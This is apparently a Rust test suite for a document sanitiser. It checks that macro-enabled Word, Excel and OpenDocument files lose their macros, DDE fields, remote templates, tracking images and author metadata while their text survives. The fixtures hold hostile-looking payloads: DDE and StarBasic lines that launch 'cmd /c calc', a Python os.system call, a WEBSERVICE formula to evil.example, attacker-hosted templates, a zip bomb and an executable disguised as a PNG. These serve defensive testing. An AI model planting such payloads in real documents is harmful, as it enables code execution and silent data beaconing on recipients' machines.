//! Sterilisation tests: everything dangerous goes, content stays, output is
//! verified and deterministic.

use super::*;
use crate::report::{MetaKey, ThreatKind, Verdict};
use crate::tests::fixtures::*;
use crate::{FileFormat, ScanPolicy, scan_default};

fn kitchen_sink_docm() -> Vec<u8> {
    let mut o = docm_with_macro();
    let body = format!(
        "{}<w:p><w:ins w:id=\"1\" w:author=\"Мария\"><w:r><w:t>принятая вставка</w:t></w:r></w:ins><w:del w:id=\"2\" w:author=\"Олег\"><w:r><w:delText>удалённый текст</w:delText></w:r></w:del>\
         <w:commentRangeStart w:id=\"0\"/><w:r><w:t>комментируемый</w:t></w:r><w:commentRangeEnd w:id=\"0\"/><w:r><w:commentReference w:id=\"0\"/></w:r></w:p>\
         <w:p w:rsidR=\"00A1B2C3\"><w:r><w:drawing><a:blip xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" r:link=\"rId7\"/></w:drawing></w:r></w:p>\
         <w:p><w:hyperlink r:id=\"rId8\"><w:r><w:t>ссылка</w:t></w:r></w:hyperlink></w:p>{}",
        dde_body(),
        dde_quote_body()
    );
    o.set("word/document.xml", document(&body))
        .set(
            "word/_rels/document.xml.rels",
            rels(&[
                ("rId1", "settings", "settings.xml", false),
                ("rId9", "http://schemas.microsoft.com/office/2006/relationships/vbaProject", "vbaProject.bin", false),
                ("rId7", "image", "https://t.example/open.gif", true),
                ("rId8", "hyperlink", "https://phish.example/login", true),
                ("rId10", "comments", "comments.xml", false),
            ]),
        )
        .set(
            "word/comments.xml",
            format!(r#"<w:comments xmlns:w="{W_NS}"><w:comment w:id="0" w:author="Ревизор" w:initials="Р"><w:p><w:r><w:t>секрет</w:t></w:r></w:p></w:comment></w:comments>"#),
        )
        .set("word/_rels/settings.xml.rels", rels(&[("rId1", "attachedTemplate", "https://attacker.example/t.dotm", true)]))
        .set(
            "word/settings.xml",
            format!(r#"<w:settings xmlns:w="{W_NS}" xmlns:r="{R_NS}"><w:attachedTemplate r:id="rId1"/><w:docVars><w:docVar w:name="p" w:val="payload"/></w:docVars><w:rsids><w:rsidRoot w:val="00A1B2C3"/><w:rsid w:val="00A1B2C3"/></w:rsids></w:settings>"#),
        )
        .set(
            "docProps/custom.xml",
            r#"<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/custom-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="2" name="Client"><vt:lpwstr>ГазНефть</vt:lpwstr></property></Properties>"#,
        )
        .set("word/printerSettings/printerSettings1.bin", "\\\\PRINTSRV01\\HP-4F".encode_utf16().flat_map(u16::to_le_bytes).chain(std::iter::repeat_n(0, 64)).collect::<Vec<u8>>())
        .set(
            "_rels/.rels",
            rels(&[
                ("rId1", "officeDocument", "word/document.xml", false),
                ("rId2", "http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties", "docProps/core.xml", false),
                ("rId3", "extended-properties", "docProps/app.xml", false),
                ("rId4", "custom-properties", "docProps/custom.xml", false),
            ]),
        );
    let ct = content_types(&[
        ("/word/document.xml", CT_DOCM),
        (
            "/word/settings.xml",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml",
        ),
        ("/word/vbaProject.bin", "application/vnd.ms-office.vbaProject"),
        (
            "/word/comments.xml",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.comments+xml",
        ),
        (
            "/docProps/custom.xml",
            "application/vnd.openxmlformats-officedocument.custom-properties+xml",
        ),
        (
            "/word/printerSettings/printerSettings1.bin",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.printerSettings",
        ),
    ]);
    o.set("[Content_Types].xml", ct);
    o.build()
}

fn part(doc: &[u8], name: &str) -> Option<String> {
    let zip =
        arca_container::zip::ZipArchive::parse(doc, arca_container::zip::ZipLimits::default())
            .unwrap();
    let mut b = arca_container::InflateBudget::default();
    zip.read_by_name(name, &mut b).unwrap().map(|v| String::from_utf8(v).unwrap())
}

#[test]
fn kitchen_sink_word_document_is_sterilised() {
    let input = kitchen_sink_docm();
    let before = scan_default(&input);
    assert_eq!(before.verdict, Verdict::ActiveContentNeutralized);

    let out = sanitize(&input, &ScanPolicy::default(), &SanitizeOptions::default()).unwrap();
    assert_eq!(out.format, FileFormat::Docx, "docm must become docx");
    assert_eq!(out.verification.verdict, Verdict::Clean, "{:#?}", out.verification.findings);
    for k in [
        ThreatKind::VbaMacros,
        ThreatKind::DdeField,
        ThreatKind::RemoteTemplate,
        ThreatKind::ExternalImage,
        ThreatKind::TrackedChanges,
        ThreatKind::Comments,
        ThreatKind::DocumentVariables,
        ThreatKind::PrinterMetadata,
        ThreatKind::CustomProperties,
    ] {
        assert!(!out.verification.has(k), "{k:?} survived");
    }
    for k in [
        MetaKey::Author,
        MetaKey::LastModifiedBy,
        MetaKey::Company,
        MetaKey::Manager,
        MetaKey::TotalEditMinutes,
        MetaKey::Printer,
        MetaKey::CustomProperty,
    ] {
        assert!(out.verification.meta(k).is_none(), "{k:?} survived");
    }
    assert_eq!(
        out.verification.meta(MetaKey::Title),
        Some("Квартальный отчёт"),
        "content metadata stays"
    );

    let doc = part(&out.bytes, "word/document.xml").unwrap();
    assert!(doc.contains("Обновить связи"), "field result must stay as static text");
    assert!(!doc.contains("DDEAUTO") && !doc.contains("QUOTE"));
    assert!(doc.contains("принятая вставка") && !doc.contains("удалённый текст"));
    assert!(doc.contains("комментируемый") && !doc.contains("commentReference"));
    assert!(doc.contains("ссылка") && !doc.contains("rId8") && !doc.contains("rId7"));
    assert!(!doc.contains("rsid"));
    arca_container::xml::validate_document(&doc, arca_container::xml::XmlLimits::default())
        .unwrap();

    assert!(part(&out.bytes, "word/vbaProject.bin").is_none());
    assert!(part(&out.bytes, "word/comments.xml").is_none());
    assert!(part(&out.bytes, "docProps/custom.xml").is_none());
    let ct = part(&out.bytes, "[Content_Types].xml").unwrap();
    assert!(!ct.to_ascii_lowercase().contains("macroenabled") && !ct.contains("vbaProject"));
    let settings = part(&out.bytes, "word/settings.xml").unwrap();
    assert!(
        !settings.contains("attachedTemplate")
            && !settings.contains("docVar")
            && settings.contains("w:settings")
    );

    let kinds: Vec<ActionKind> = out.actions.iter().map(|a| a.kind).collect();
    for k in [
        ActionKind::RemovedPart,
        ActionKind::RemovedExternalReference,
        ActionKind::NeutralizedField,
        ActionKind::AcceptedRevisions,
        ActionKind::RemovedComments,
        ActionKind::StrippedMetadata,
        ActionKind::ConvertedContentType,
    ] {
        assert!(kinds.contains(&k), "missing action {k:?}: {:#?}", out.actions);
    }
}

#[test]
fn excel_macros_and_formulas_are_sterilised() {
    let mut o = xlsm_with_xlm();
    o.set(
        "xl/worksheets/sheet1.xml",
        format!(r#"<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="{R_NS}"><sheetData><row r="1"><c r="A1"><f>cmd|' /C calc'!A0</f><v>0</v></c><c r="B1"><f>SUM(1,2)</f><v>3</v></c></row></sheetData></worksheet>"#),
    );
    let out = sanitize(&o.build(), &ScanPolicy::default(), &SanitizeOptions::default()).unwrap();
    assert_eq!(out.format, FileFormat::Xlsx);
    assert_eq!(out.verification.verdict, Verdict::Clean, "{:#?}", out.verification.findings);
    let wb = part(&out.bytes, "xl/workbook.xml").unwrap();
    assert!(!wb.contains("Macro1") && !wb.contains("Auto_Open"));
    assert!(wb.contains("name=\"Total\""), "unrelated defined names stay");
    let sheet = part(&out.bytes, "xl/worksheets/sheet1.xml").unwrap();
    assert!(!sheet.contains("cmd|") && sheet.contains("SUM(1,2)") && sheet.contains("<v>0</v>"));
    assert!(part(&out.bytes, "xl/macrosheets/sheet1.xml").is_none());
}

#[test]
fn output_is_deterministic_and_idempotent() {
    let input = kitchen_sink_docm();
    let a = sanitize(&input, &ScanPolicy::default(), &SanitizeOptions::default()).unwrap();
    let b = sanitize(&input, &ScanPolicy::default(), &SanitizeOptions::default()).unwrap();
    assert_eq!(a.bytes, b.bytes);
    let again = sanitize(&a.bytes, &ScanPolicy::default(), &SanitizeOptions::default()).unwrap();
    assert_eq!(again.bytes, a.bytes, "sanitising a sterile file changes nothing");
}

#[test]
fn hostile_and_unsupported_inputs() {
    let mut bomb = docx();
    bomb.set("word/media/b.xml", vec![b'A'; 30 << 20]);
    assert!(matches!(
        sanitize(&bomb.build(), &ScanPolicy::default(), &SanitizeOptions::default()),
        Err(SanitizeError::Rejected(_))
    ));
    assert!(matches!(
        sanitize(&pdf_with_js(), &ScanPolicy::default(), &SanitizeOptions::default()),
        Err(SanitizeError::Unsupported(FileFormat::Pdf))
    ));
    assert!(matches!(
        sanitize(&doc_binary(), &ScanPolicy::default(), &SanitizeOptions::default()),
        Err(SanitizeError::Unsupported(FileFormat::Doc))
    ));
}

#[test]
fn sanitized_document_survives_the_wire() {
    let out =
        sanitize(&docm_with_macro().build(), &ScanPolicy::default(), &SanitizeOptions::default())
            .unwrap();
    let bytes = arca_abi::wire::to_bytes(&out).unwrap();
    let back: SanitizedDocument =
        arca_abi::wire::from_bytes(&bytes, arca_abi::wire::DecodeLimits::default()).unwrap();
    assert_eq!(back, out);
}

/// Writes kitchen-sink inputs and their sterile copies to `$ARCA_DUMP_DIR`.
#[test]
fn dump_sanitized_for_external_validation() {
    let Some(dir) = std::env::var_os("ARCA_DUMP_DIR") else { return };
    let dir = std::path::PathBuf::from(dir);
    std::fs::create_dir_all(&dir).unwrap();
    let input = kitchen_sink_docm();
    std::fs::write(dir.join("kitchen_sink.docm"), &input).unwrap();
    let out = sanitize(&input, &ScanPolicy::default(), &SanitizeOptions::default()).unwrap();
    std::fs::write(dir.join("kitchen_sink.sanitized.docx"), &out.bytes).unwrap();
    let xl =
        sanitize(&xlsm_with_xlm().build(), &ScanPolicy::default(), &SanitizeOptions::default())
            .unwrap();
    std::fs::write(dir.join("xlm.sanitized.xlsx"), &xl.bytes).unwrap();
    let odt = kitchen_sink_odt();
    std::fs::write(dir.join("kitchen_sink.odt"), &odt).unwrap();
    let out = sanitize(&odt, &ScanPolicy::default(), &SanitizeOptions::default()).unwrap();
    std::fs::write(dir.join("kitchen_sink.sanitized.odt"), &out.bytes).unwrap();
}

// ---------------------------------------------------------------------------------------
// OpenDocument
// ---------------------------------------------------------------------------------------

const ODF_NS: &str = r#"xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:config="urn:oasis:names:tc:opendocument:xmlns:config:1.0" xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0""#;

/// A flat list of `(name, bytes)` that is written as an ODF package.
fn odf_package(mimetype: &str, members: &[(&str, Vec<u8>)]) -> Vec<u8> {
    use arca_container::zip::writer::{Compression, ZipWriter};
    let mut w = ZipWriter::new();
    w.add("mimetype", mimetype.as_bytes(), Compression::Stored).unwrap();
    for (n, d) in members {
        w.add(n, d, Compression::Deflated).unwrap();
    }
    w.finish().unwrap()
}

const ODT: &str = "application/vnd.oasis.opendocument.text";

fn kitchen_sink_odt() -> Vec<u8> {
    let manifest = format!(
        r#"<manifest:manifest {ODF_NS}><manifest:file-entry manifest:full-path="/" manifest:media-type="{ODT}"/><manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/><manifest:file-entry manifest:full-path="Basic/" manifest:media-type=""/><manifest:file-entry manifest:full-path="Basic/Standard/Module1.xml" manifest:media-type="text/xml"/><manifest:file-entry manifest:full-path="Object 1/" manifest:media-type="application/vnd.oasis.opendocument.chart"/><manifest:file-entry manifest:full-path="Object 1/content.xml" manifest:media-type="text/xml"/><manifest:file-entry manifest:full-path="Thumbnails/thumbnail.png" manifest:media-type="image/png"/><manifest:file-entry manifest:full-path="Pictures/a.png" manifest:media-type="image/png"/></manifest:manifest>"#
    );
    let content = format!(
        r##"<office:document-content {ODF_NS} office:version="1.3"><office:scripts><office:script script:language="ooo:Basic"/><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document"/></office:event-listeners></office:scripts><office:body><office:text>
<text:p>видимый текст <text:a xlink:href="https://phish.example/login">ссылка</text:a> и <text:a xlink:href="#закладка">внутренняя</text:a></text:p>
<text:p><text:author-name>Мария</text:author-name><text:modification-date>2024-01-01</text:modification-date>после полей</text:p>
<text:p>до <office:annotation><dc:creator>Ревизор</dc:creator><text:p>секретная заметка</text:p></office:annotation>комментария</text:p>
<text:tracked-changes><text:changed-region text:id="c1"><text:deletion><office:change-info><dc:creator>Олег</dc:creator></office:change-info><text:p>удалённый текст</text:p></text:deletion></text:changed-region></text:tracked-changes>
<text:p>вставка<text:change text:change-id="c1"/>принятая</text:p>
<draw:frame draw:name="F1"><draw:image xlink:href="http://t.example/px.png"/></draw:frame>
<draw:frame draw:name="F2"><draw:object xlink:href="./Object 1"/><draw:image xlink:href="./ObjectReplacements/Object 1"/></draw:frame>
<draw:frame draw:name="F3"><draw:image xlink:href="Pictures/a.png"/></draw:frame>
<text:p><text:dde-connection-decls><text:dde-connection-decl office:name="d1" office:dde-application="cmd" office:dde-topic="/c calc" office:dde-item="x"/></text:dde-connection-decls>ничего</text:p>
<table:table table:name="T"><table:table-row>
<table:table-cell office:value-type="string" office:string-value="кэш" table:formula="of:=WEBSERVICE(&quot;http://evil.example/?x=1&quot;)"><text:p>кэш</text:p></table:table-cell>
<table:table-cell office:value-type="float" office:value="3" table:formula="of:=SUM([.A1])"><text:p>3</text:p></table:table-cell>
<table:table-cell office:value-type="float" office:value="7" table:formula="of:=&apos;file:///share/other.ods&apos;#$Sheet1.A1"><text:p>7</text:p></table:table-cell>
</table:table-row></table:table>
</office:text></office:body></office:document-content>"##
    );
    let meta = format!(
        r#"<office:document-meta {ODF_NS}><office:meta><meta:generator>LibreOffice/25.8</meta:generator><meta:initial-creator>Пётр</meta:initial-creator><dc:creator>Анна</dc:creator><meta:editing-duration>PT2H5M</meta:editing-duration><meta:user-defined meta:name="Client">ГазНефть</meta:user-defined><meta:template xlink:href="https://attacker.example/t.ott" xlink:type="simple"/><dc:title>Квартальный отчёт</dc:title></office:meta></office:document-meta>"#
    );
    let settings = format!(
        r#"<office:document-settings {ODF_NS}><office:settings><config:config-item-set config:name="ooo:configuration-settings"><config:config-item config:name="PrinterName" config:type="string">\\PRINTSRV01\HP-4F</config:config-item><config:config-item config:name="ZoomValue" config:type="int">100</config:config-item></config:config-item-set></office:settings></office:document-settings>"#
    );
    odf_package(
        ODT,
        &[
            ("META-INF/manifest.xml", manifest.into_bytes()),
            ("content.xml", content.into_bytes()),
            ("meta.xml", meta.into_bytes()),
            ("settings.xml", settings.into_bytes()),
            (
                "Basic/Standard/Module1.xml",
                br#"<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">Sub Main
  Shell("cmd /c calc")
End Sub</script:module>"#
                    .to_vec(),
            ),
            ("Scripts/python/evil.py", b"import os\nos.system('calc')\n".to_vec()),
            ("Thumbnails/thumbnail.png", vec![0x89, b'P', b'N', b'G', 1, 2, 3]),
            ("Object 1/content.xml", format!("<office:document-content {ODF_NS}/>").into_bytes()),
            ("ObjectReplacements/Object 1", b"preview".to_vec()),
            ("Pictures/a.png", vec![0x89, b'P', b'N', b'G', 9, 9, 9]),
            ("META-INF/documentsignatures.xml", b"<signatures/>".to_vec()),
        ],
    )
}

fn odf_part(zip_bytes: &[u8], name: &str) -> Option<Vec<u8>> {
    let zip = arca_container::zip::ZipArchive::parse(zip_bytes, ScanPolicy::default().zip).unwrap();
    let mut budget = arca_container::InflateBudget::new(1 << 28, 1000, 1 << 26);
    zip.entry(name).map(|e| zip.read(e, &mut budget).unwrap())
}

fn odf_text(zip_bytes: &[u8], name: &str) -> String {
    String::from_utf8(odf_part(zip_bytes, name).unwrap()).unwrap()
}

#[test]
fn opendocument_is_rebuilt_without_anything_active_remote_or_personal() {
    let input = kitchen_sink_odt();
    let before = scan_default(&input);
    for k in [
        ThreatKind::StarBasicMacros,
        ThreatKind::OdfEventScript,
        ThreatKind::ExternalImage,
        ThreatKind::AuthorMetadata,
    ] {
        assert!(before.has(k), "the input should have {k:?}: {:#?}", before.findings);
    }
    let out = sanitize(&input, &ScanPolicy::default(), &SanitizeOptions::default()).unwrap();
    assert_eq!(out.format, FileFormat::Odt);
    assert_eq!(out.verification.verdict, Verdict::Clean, "{:#?}", out.verification.findings);
    for k in [
        ThreatKind::StarBasicMacros,
        ThreatKind::EmbeddedScript,
        ThreatKind::OdfEventScript,
        ThreatKind::ExternalImage,
        ThreatKind::DdeFormula,
        ThreatKind::DangerousFormula,
        ThreatKind::AuthorMetadata,
        ThreatKind::PrinterMetadata,
        ThreatKind::OleObject,
    ] {
        assert!(!out.verification.has(k), "{k:?} survived");
    }
    for k in [
        MetaKey::Author,
        MetaKey::LastModifiedBy,
        MetaKey::TotalEditMinutes,
        MetaKey::Printer,
        MetaKey::CustomProperty,
        MetaKey::Template,
    ] {
        assert!(out.verification.meta(k).is_none(), "{k:?} survived");
    }

    // Members.
    for gone in [
        "Basic/Standard/Module1.xml",
        "Scripts/python/evil.py",
        "Thumbnails/thumbnail.png",
        "Object 1/content.xml",
        "ObjectReplacements/Object 1",
        "META-INF/documentsignatures.xml",
    ] {
        assert!(odf_part(&out.bytes, gone).is_none(), "{gone} survived");
    }
    assert_eq!(odf_part(&out.bytes, "Pictures/a.png"), Some(vec![0x89, b'P', b'N', b'G', 9, 9, 9]));
    let zip =
        arca_container::zip::ZipArchive::parse(&out.bytes, ScanPolicy::default().zip).unwrap();
    assert_eq!(zip.entries().first().map(|e| e.name()), Some("mimetype"), "mimetype stays first");
    assert_eq!(odf_part(&out.bytes, "mimetype").unwrap(), ODT.as_bytes());

    // Manifest.
    let manifest = odf_text(&out.bytes, "META-INF/manifest.xml");
    for gone in ["Basic/", "Object 1", "Thumbnails"] {
        assert!(!manifest.contains(gone), "{gone} is still in the manifest: {manifest}");
    }
    assert!(manifest.contains("Pictures/a.png") && manifest.contains("content.xml"));

    // Content: what is content stays, the rest is gone.
    let content = odf_text(&out.bytes, "content.xml");
    arca_container::xml::validate_document(&content, arca_container::xml::XmlLimits::default())
        .unwrap();
    for kept in [
        "видимый текст",
        "ссылка",
        "внутренняя",
        "#закладка",
        "после полей",
        "комментария",
        "вставка",
        "принятая",
        "Pictures/a.png",
        "SUM([.A1])",
        r#"office:string-value="кэш""#,
        "ничего",
    ] {
        assert!(content.contains(kept), "lost {kept:?}:\n{content}");
    }
    for gone in [
        "phish.example",
        "t.example",
        "Мария",
        "2024-01-01",
        "Ревизор",
        "секретная заметка",
        "удалённый текст",
        "tracked-changes",
        "text:change ",
        "dde-connection",
        "WEBSERVICE",
        "evil.example",
        "other.ods",
        "office:scripts",
        "event-listener",
        "Object 1",
        "vnd.sun.star.script",
    ] {
        assert!(!content.contains(gone), "{gone:?} survived:\n{content}");
    }
    let meta = odf_text(&out.bytes, "meta.xml");
    assert!(
        !meta.contains("Пётр")
            && !meta.contains("Анна")
            && !meta.contains("PT2H5M")
            && !meta.contains("ГазНефть")
            && !meta.contains("attacker")
            && !meta.contains("LibreOffice"),
        "{meta}"
    );
    let settings = odf_text(&out.bytes, "settings.xml");
    assert!(!settings.contains("PRINTSRV01") && settings.contains("ZoomValue"), "{settings}");

    let kinds: Vec<ActionKind> = out.actions.iter().map(|a| a.kind).collect();
    for k in [
        ActionKind::RemovedPart,
        ActionKind::RemovedElement,
        ActionKind::RemovedExternalReference,
        ActionKind::RemovedFormula,
        ActionKind::AcceptedRevisions,
        ActionKind::RemovedComments,
        ActionKind::StrippedMetadata,
    ] {
        assert!(kinds.contains(&k), "missing action {k:?}: {:#?}", out.actions);
    }

    // Deterministic and idempotent.
    let again = sanitize(&input, &ScanPolicy::default(), &SanitizeOptions::default()).unwrap();
    assert_eq!(again.bytes, out.bytes);
    let twice = sanitize(&out.bytes, &ScanPolicy::default(), &SanitizeOptions::default()).unwrap();
    assert_eq!(twice.bytes, out.bytes, "sanitising a sterile file changes nothing");
}

#[test]
fn opendocument_options_keep_what_was_not_asked_to_go() {
    let input = kitchen_sink_odt();
    let opts = SanitizeOptions {
        accept_revisions: false,
        remove_comments: false,
        strip_metadata: false,
        remove_custom_xml: true,
    };
    let out = sanitize(&input, &ScanPolicy::default(), &opts).unwrap();
    let content = odf_text(&out.bytes, "content.xml");
    assert!(
        content.contains("tracked-changes") && content.contains("удалённый текст"),
        "revisions stay"
    );
    assert!(content.contains("секретная заметка"), "comments stay");
    assert!(content.contains("Мария"), "fields stay");
    let meta = odf_text(&out.bytes, "meta.xml");
    assert!(meta.contains("Пётр") && meta.contains("Квартальный отчёт"), "metadata stays");
    // Active and remote content goes whatever the options say.
    assert!(!meta.contains("attacker.example"), "a remote template link is not metadata");
    assert!(!content.contains("phish.example") && !content.contains("office:scripts"));
    assert!(odf_part(&out.bytes, "Basic/Standard/Module1.xml").is_none());
    assert_eq!(out.verification.verdict, Verdict::Clean, "{:#?}", out.verification.findings);
}

#[test]
fn encrypted_and_hostile_opendocument_are_refused_not_mangled() {
    let manifest = format!(
        r#"<manifest:manifest {ODF_NS}><manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"><manifest:encryption-data manifest:checksum-type="SHA1"/></manifest:file-entry></manifest:manifest>"#
    );
    let enc = odf_package(
        ODT,
        &[
            ("META-INF/manifest.xml", manifest.into_bytes()),
            ("content.xml", vec![0xDE, 0xAD, 0xBE, 0xEF]),
        ],
    );
    assert!(sanitize(&enc, &ScanPolicy::default(), &SanitizeOptions::default()).is_err());
    // A package whose XML is not well-formed cannot be rebuilt.
    let broken = odf_package(
        ODT,
        &[(
            "content.xml",
            b"<office:document-content><unclosed></office:document-content>".to_vec(),
        )],
    );
    assert!(sanitize(&broken, &ScanPolicy::default(), &SanitizeOptions::default()).is_err());
    // An OLE container or an executable hidden under a harmless name goes.
    let mut pe = b"MZ".to_vec();
    pe.extend(vec![0u8; 200]);
    let sneaky = odf_package(
        ODT,
        &[
            ("content.xml", format!("<office:document-content {ODF_NS}/>").into_bytes()),
            ("Pictures/innocent.png", pe),
        ],
    );
    let r = sanitize(&sneaky, &ScanPolicy::default(), &SanitizeOptions::default());
    if let Ok(out) = r {
        assert!(odf_part(&out.bytes, "Pictures/innocent.png").is_none());
    }
}

#[test]
fn mutated_opendocument_never_panics() {
    let base = kitchen_sink_odt();
    let mut state = 0x2545_F491_4F6C_DD1Du64;
    let mut next = move || {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        state
    };
    for _ in 0..200 {
        let mut m = base.clone();
        for _ in 0..4 {
            let i = usize::try_from(next() % u64::try_from(m.len()).unwrap()).unwrap();
            m[i] = u8::try_from(next() & 0xFF).unwrap();
        }
        let _ = sanitize(&m, &ScanPolicy::default(), &SanitizeOptions::default());
    }
}
